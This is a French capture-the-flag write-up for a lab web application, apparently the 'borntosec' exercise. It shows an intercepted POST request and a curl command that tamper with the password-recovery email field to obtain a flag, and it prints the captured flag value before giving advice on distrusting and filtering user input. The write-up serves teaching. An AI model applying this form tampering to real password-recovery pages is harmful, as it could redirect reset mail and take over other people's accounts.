# Unvalidated redirection mail

## Exploitation

Avec BurpSuite on peux changer la requete envoyer au serveur pour changer la destination du mail qui est initialement prevue

```
POST /?page=recover HTTP/1.1
Host: 192.168.122.55
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://192.168.122.55
Connection: close
Referer: http://192.168.122.55/?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```

mail=hacker%40borntosec.com&Submit=Submit


avec curl:

```bash
$> curl 'http://192.168.99.100/?page=recover' --data 'mail=hacker%40borntosec.com&Submit=Submit' | grep flag

The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

## Resolution

Ne faites jamais confiance aux champs de saisie utilisateur. Toutes les entrées des utilisateurs doivent être considérées comme non fiables et potentiellement malveillantes. 
Les applications qui traitent les entrées non fiables peuvent devenir vulnérables aux attaques telles que les dépassements de tampon, l'injection SQL, la commande du système d'exploitation, le déni de service et l'injection d'e-mails.
Utilisez des regex pour filtrer les données utilisateur. Par exemple, nous pouvons rechercher (\r ou \n) dans la chaîne d'entrée.
